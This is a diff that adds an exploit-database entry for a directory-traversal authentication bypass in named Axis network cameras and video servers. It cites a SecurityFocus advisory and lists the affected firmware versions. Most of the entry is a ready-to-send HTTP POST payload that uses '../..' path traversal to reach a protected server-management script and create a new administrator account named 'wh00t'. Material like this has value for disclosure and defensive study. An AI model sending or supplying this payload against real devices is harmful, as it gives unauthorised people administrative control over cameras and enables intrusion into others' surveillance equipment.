@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/11011/info
+
+A directory-traversal vulnerability in HTTP POST requests. This attack is demonstrated by an anonymous user calling protected administration scripts. This bypasses authentication checks and gives anonymous users remote adminitration of the devices.
+ 
+This issue is reported to affect:
+- Axis 2100, 2110, 2120, 2420 network cameras with firmware versions 2.12 thru 2.40
+- Axis 2130 network cameras
+- Axis 2401,and 2401 video servers
+
+POST /cgi-bin/scripts/../../this_server/ServerManager.srv HTTP/1.0
+Content-Length: 250
+Pragma: no-cache
+
+conf_Security_List=root%%3AADVO%%3A%%3Awh00t%%3AAD%%3A119104048048116%%3A&users=wh00t&username=wh00t&password1=wh00t&password2=wh00t&checkAdmin=on&checkDial=on&checkView=on&servermanager_return_page=%%2Fadmin%%2Fsec_users.shtml&servermanager_do=set_variables 
